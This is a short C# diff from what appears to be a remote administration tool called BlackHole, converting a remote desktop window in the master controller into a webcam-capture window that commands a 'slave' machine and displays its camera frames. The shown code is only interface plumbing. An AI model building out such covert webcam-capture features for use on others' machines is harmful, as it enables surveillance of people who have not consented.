@@ -11,9 +11,9 @@ namespace BlackHole.Master
     /// <summary>
     /// Logique d'interaction pour RemoteDesktopWindow.xaml
     /// </summary>
-    public partial class RemoteDesktopWindow : SlaveWindow
+    public partial class WebcamWindow : SlaveWindow
     {
-        public RemoteDesktopWindow()
+        public WebcamWindow()
         {
             InitializeComponent();
         }
@@ -22,7 +22,7 @@ namespace BlackHole.Master
         /// 
         /// </summary>
         /// <param name="slave"></param>
-        public RemoteDesktopWindow(Slave slave)
+        public WebcamWindow(Slave slave)
             : base(slave)
         {
             InitializeComponent();
@@ -36,8 +36,7 @@ namespace BlackHole.Master
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void OnStartCapture(object sender, RoutedEventArgs e) =>
-            StartCapture(0, int.Parse(TxtBoxQuality.Text), int.Parse(TxtBoxRate.Text));
+        private void OnStartCapture(object sender, RoutedEventArgs e) => StartCapture();
 
         /// <summary>
         /// 
@@ -49,27 +48,24 @@ namespace BlackHole.Master
         /// <summary>
         /// 
         /// </summary>
-        private void StartCapture(int screen = 0, int quality = 10, int rate = 10) => Send(new StartScreenCaptureMessage
-        {
-            Quality = quality,
-            Rate = rate,
-            ScreenNumber = screen
-        });
+        private void StartCapture() => Send(new StartWebcamCaptureMessage());
 
         /// <summary>
         /// 
         /// </summary>
-        private void StopCapture() => Send(new StopScreenCaptureMessage());
+        private void StopCapture() => Send(new StopWebcamCaptureMessage());
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="message"></param>
-        private void UpdateScreenCapture(ScreenCaptureMessage message)
+        private void UpdateScreenCapture(WebcamCaptureMessage message)
         {
-            if (ScreenCaptureImage.Source != null)
-                ((BitmapImage)ScreenCaptureImage.Source).StreamSource.Dispose();
-            ScreenCaptureImage.Source = ImageHelpers.BitmapToImageSource(message.RawImage);
+            if (WebcamImage.Source != null)
+                ((BitmapImage)WebcamImage.Source).StreamSource.Dispose();
+            WebcamImage.Source = ImageHelpers.BitmapToImageSource(message.RawImage);
+
+            TxtBoxRate.Text = message.FrameRate.ToString();
         }
 
         /// <summary>
@@ -85,7 +81,7 @@ namespace BlackHole.Master
                 {
                     case SlaveEventType.IncommingMessage:
                     {
-                        ev.Data.Match().With<ScreenCaptureMessage>(UpdateScreenCapture);
+                        ev.Data.Match().With<WebcamCaptureMessage>(UpdateScreenCapture);
                         break;
                     }
                 }
